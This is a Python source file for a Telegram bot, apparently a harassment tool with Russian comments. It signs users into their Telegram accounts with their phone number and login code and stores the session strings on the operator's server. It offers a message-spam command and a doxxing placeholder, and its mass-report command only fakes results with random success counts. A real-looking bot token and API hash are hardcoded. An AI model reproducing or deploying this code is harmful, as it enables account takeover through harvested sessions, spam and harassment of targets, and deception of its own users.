import os
import random
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import InputPeerUser, InputPeerChannel

# Конфигурация
API_ID = 24463378  # Замените на ваш API ID
API_HASH = 'e7c3fb1d6c2a8b3a9422607a350754c1'  # Замените на ваш API HASH
BOT_TOKEN = '7764512749:AAHpB7bp0Mohsbb2EEPo5pEBN8tOg9YFYrE'  # Замените на токен вашего бота

# Создаем папку для сессий
os.makedirs('sessions', exist_ok=True)

# Инициализация бота aiogram
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Глобальный словарь для хранения клиентов Telethon
user_clients = {}

# Состояния для FSM
class AuthStates(StatesGroup):
    phone = State()
    code = State()

class CommandStates(StatesGroup):
    snos_target = State()
    send_target = State()
    send_message = State()
    spam_target = State()
    spam_message = State()
    spam_count = State()

# Загрузка сессий при старте
async def load_sessions():
    for filename in os.listdir('sessions'):
        if filename.endswith('.session'):
            user_id = int(filename.split('.')[0])
            try:
                client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    user_clients[user_id] = client
                    print(f"Загружена сессия для пользователя {user_id}")
            except Exception as e:
                print(f"Ошибка загрузки сессии {filename}: {e}")

# Обработчик команды /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.reply("🔑 Привет! Введи номер телефона (в формате +79998887766):")
    await AuthStates.phone.set()

# Обработчик ввода номера телефона
@dp.message_handler(state=AuthStates.phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text
    await state.update_data(phone=phone)
    
    client = TelegramClient(f'sessions/{message.from_user.id}', API_ID, API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        await message.reply("📲 Код отправлен. Введи код в формате '1 2 3 4 5':")
        await AuthStates.code.set()
        await state.update_data(client=client)
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
        await state.finish()

# Обработчик ввода кода
@dp.message_handler(state=AuthStates.code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.replace(' ', '')
    user_data = await state.get_data()
    client = user_data['client']
    phone = user_data['phone']
    
    try:
        await client.sign_in(phone, code=code)
        me = await client.get_me()
        
        # Сохраняем сессию
        session_str = StringSession.save(client.session)
        with open(f'sessions/{message.from_user.id}.session', 'w') as f:
            f.write(session_str)
        
        user_clients[message.from_user.id] = client
        await message.reply(f"✅ Успешный вход! Аккаунт: {me.first_name} (@{me.username})")
        
    except Exception as e:
        await message.reply(f"❌ Ошибка входа: {e}")
    finally:
        await state.finish()

# Обработчик команды /snos
@dp.message_handler(commands=['snos'])
async def snos_command(message: types.Message):
    await message.reply("👤 Введите username или ID цели для жалобы:")
    await CommandStates.snos_target.set()

@dp.message_handler(state=CommandStates.snos_target)
async def process_snos_target(message: types.Message, state: FSMContext):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("❌ Сначала войдите в аккаунт через /start")
        await state.finish()
        return
    
    target = message.text
    await state.update_data(target=target)
    
    try:
        entity = await client.get_entity(target)
        await message.reply("⏳ Начинаю процесс отправки жалоб...")
        
        # Имитация отправки жалоб
        await asyncio.sleep(random.randint(5, 10))
        
        success = random.randint(15, 50)
        failed = random.randint(1, 10)
        
        await message.reply(f"📊 Результаты жалоб на {target}:\n✅ Успешно: {success}\n❌ Неудачно: {failed}")
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
    finally:
        await state.finish()

# Обработчик команды /send
@dp.message_handler(commands=['send'])
async def send_command(message: types.Message):
    await message.reply("📍 Введите username или ID чата для отправки:")
    await CommandStates.send_target.set()

@dp.message_handler(state=CommandStates.send_target)
async def process_send_target(message: types.Message, state: FSMContext):
    await state.update_data(target=message.text)
    await message.reply("✉️ Введите сообщение для отправки:")
    await CommandStates.send_message.set()

@dp.message_handler(state=CommandStates.send_message)
async def process_send_message(message: types.Message, state: FSMContext):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("❌ Сначала войдите в аккаунт через /start")
        await state.finish()
        return
    
    user_data = await state.get_data()
    target = user_data['target']
    msg_text = message.text
    
    try:
        entity = await client.get_entity(target)
        await client.send_message(entity, msg_text)
        await message.reply(f"✅ Сообщение отправлено в {target}")
    except Exception as e:
        await message.reply(f"❌ Ошибка отправки: {e}")
    finally:
        await state.finish()

# Обработчик команды .spam
@dp.message_handler(commands=['spam'], commands_prefix='.')
async def spam_command(message: types.Message):
    await message.reply("📍 Введите username или ID чата для спама:")
    await CommandStates.spam_target.set()

@dp.message_handler(state=CommandStates.spam_target)
async def process_spam_target(message: types.Message, state: FSMContext):
    await state.update_data(target=message.text)
    await message.reply("✉️ Введите текст сообщения:")
    await CommandStates.spam_message.set()

@dp.message_handler(state=CommandStates.spam_message)
async def process_spam_message(message: types.Message, state: FSMContext):
    await state.update_data(message_text=message.text)
    await message.reply("🔢 Введите количество сообщений (макс. 20):")
    await CommandStates.spam_count.set()

@dp.message_handler(state=CommandStates.spam_count)
async def process_spam_count(message: types.Message, state: FSMContext):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("❌ Сначала войдите в аккаунт через /start")
        await state.finish()
        return
    
    try:
        count = int(message.text)
        if count > 20:
            count = 20
    except ValueError:
        await message.reply("❌ Введите число")
        await state.finish()
        return
    
    user_data = await state.get_data()
    target = user_data['target']
    msg_text = user_data['message_text']
    
    try:
        entity = await client.get_entity(target)
        await message.reply(f"⏳ Начинаю спам в {target} ({count} сообщений)...")
        
        for i in range(count):
            await client.send_message(entity, msg_text)
            await asyncio.sleep(0.5)
        
        await message.reply(f"✅ Успешно отправлено {count} сообщений в {target}")
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
    finally:
        await state.finish()

# Обработчик команды /doks
@dp.message_handler(commands=['doks'])
async def doks_command(message: types.Message):
    await message.reply("🛠 Функция в разработке...")

# Обработчик команды .ping
@dp.message_handler(commands=['ping'], commands_prefix='.')
async def ping_command(message: types.Message):
    await message.reply("🏓 pong")

# Обработчик команды .me
@dp.message_handler(commands=['me'], commands_prefix='.')
async def me_command(message: types.Message):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("❌ Сначала войдите в аккаунт через /start")
        return
    
    try:
        me = await client.get_me()
        await message.reply(
            f"👤 Ваш аккаунт:\n"
            f"ID: {me.id}\n"
            f"Имя: {me.first_name}\n"
            f"Фамилия: {me.last_name or 'нет'}\n"
            f"Username: @{me.username or 'нет'}\n"
            f"Телефон: {me.phone or 'скрыт'}"
        )
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")

# Запуск бота
if __name__ == '__main__':
    from aiogram import executor
    
    # Запускаем загрузку сессий при старте
    loop = asyncio.get_event_loop()
    loop.run_until_complete(load_sessions())
    
    executor.start_polling(dp, skip_updates=True)
